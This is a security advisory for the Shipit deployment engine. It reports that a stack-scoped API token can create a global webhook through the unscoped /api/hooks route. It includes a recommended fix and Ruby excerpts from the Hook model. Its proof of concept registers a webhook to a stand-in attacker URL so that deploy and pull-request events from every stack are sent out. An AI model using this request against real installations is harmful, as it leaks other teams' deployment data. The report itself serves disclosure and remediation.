### Title
API token scoped to a single stack can register a global webhook that receives every stack's events - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`ApiClient` permission checks for the Hooks API are purely operation:scope string checks (`read:hook` / `write:hook`) and are never cross-checked against the stack the client is scoped to (`ApiClient#stack_id`). This lets an `ApiClient` that is authorized only for one stack create a *global* `Hook` (one with `stack_id: nil`) that is subscribed to the events of every stack in the installation, breaking the binding that a token's authorized stack must equal the stack(s) whose data the token can access.

### Finding Description
`ApiClient` records can optionally be scoped to a single stack via `belongs_to :stack, optional: true` and the `stack_id` column. [1](#0-0) 

`Api::BaseController#stacks` enforces that scoping for stack-nested endpoints: [2](#0-1) 

However, `Api::HooksController` is mounted both nested under a stack (`/api/stacks/*stack_id/hooks`) and at the top level, unscoped (`resources :hooks`): [3](#0-2) 

`HooksController` derives which hooks a request can touch from `params[:stack_id]` alone, not from `current_api_client.stack_id`: [4](#0-3) 

Its permission checks are only the generic `read:hook` / `write:hook` scope checks: [5](#0-4) 

When the top-level `/api/hooks` route is used, `params[:stack_id]` is absent, so `stack_id` evaluates to `nil`, and `hooks` becomes `Hook.where(stack_id: nil)` — i.e. the set of *global* hooks. `Hook.for_stack` shows that global hooks (`stack_id: nil`) are delivered for every stack's events, not just one: [6](#0-5) 

So an `ApiClient` created with a specific `stack_id` (e.g. fixture `here_come_the_walrus`, scoped to stack `shipit`) and granted the generic `write:hook` permission is authorized "for stack `shipit`" per `ApiClient#stack_id`, but nothing prevents it from calling `POST /api/hooks` (unscoped route) to create a global hook. That hook then receives `stack`, `deploy`, `task`, `rollback`, `commit_status`, `merge`, `pull_request`, etc. events for **every** stack in the Shipit instance — including stacks/repositories the token was never authorized to read.

This is exactly the "a stack a token authorises versus a [scope] it touches" binding break: before the attacker's request, `ApiClient.stack_id` == the only stack the client can see (enforced in `BaseController#stacks`); after creating the global hook, the client's authorization footprint silently expands to all stacks, because `HooksController` never consults `current_api_client.stack_id?` when deciding which `Hook` scope to operate on.

### Impact Explanation
A token meant to be readable/writable only for one stack (e.g. a CI integration for a single low-trust repository) can escalate to receive an unauthenticated-feed of deploy/task/commit-status/merge/pull_request events — effectively an out-of-band read of stack state and deploy output — for every other stack managed by the Shipit instance, including stacks belonging to different, unrelated repositories/teams. This matches the High-impact category of "unauthenticated read of stack state, task streams or deploy output" achieved through an authorization-scope escalation, without requiring any additional privilege beyond an already-issued, narrowly-scoped `ApiClient` token with `write:hook`.

### Likelihood Explanation
Any deployment that issues `ApiClient` tokens scoped to individual stacks (a documented, supported feature — see the `stack` association and the `here_come_the_walrus` fixture pattern) and that also grants `write:hook` to such scoped tokens (there is no validation preventing this combination) is exploitable with a single unauthenticated-relative-to-other-stacks API call (`POST /api/hooks`) using valid Basic-Auth credentials for that one scoped token.

### Recommendation
In `Api::HooksController`, reject or scope hook operations against `current_api_client.stack_id` when the client is stack-scoped: if `current_api_client.stack_id?` is true, force `stack_id` to equal `current_api_client.stack_id` (denying creation/listing of global hooks, and denying access to hooks belonging to other stacks) regardless of the `params[:stack_id]` value. Alternatively, deny access to the top-level `/api/hooks` routes entirely for any `ApiClient` where `stack_id?` is true.

### Proof of Concept
1. Create (or use) an `ApiClient` scoped to stack `shipit/shipit-engine/production` with permission `write:hook` (mirrors fixture `here_come_the_walrus`, which already has `stack: shipit` — granting it `write:hook` is not prevented by any validation).
2. Using that client's Basic-Auth token, call:
   ```
   POST /api/hooks
   {
     "delivery_url": "https://attacker.example.com/collect",
     "events": ["deploy", "task", "commit_status", "pull_request", "merge"]
   }
   ```
   This hits the unscoped `resources :hooks` route, so `params[:stack_id]` is absent, `stack_id` resolves to `nil`, and `hooks.create(params)` creates a `Hook` with `stack_id: nil`.
3. From this point on, `Hook.deliver` (invoked via `Hook.emit` for any stack) matches this hook through `for_stack(stack_id).listening_event(event)` (`where(stack_id: [nil, stack_id])`) for every stack in the installation, sending deploy/task/commit-status/merge/pull_request payloads for stacks the original token was never authorized to access to `https://attacker.example.com/collect`.

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
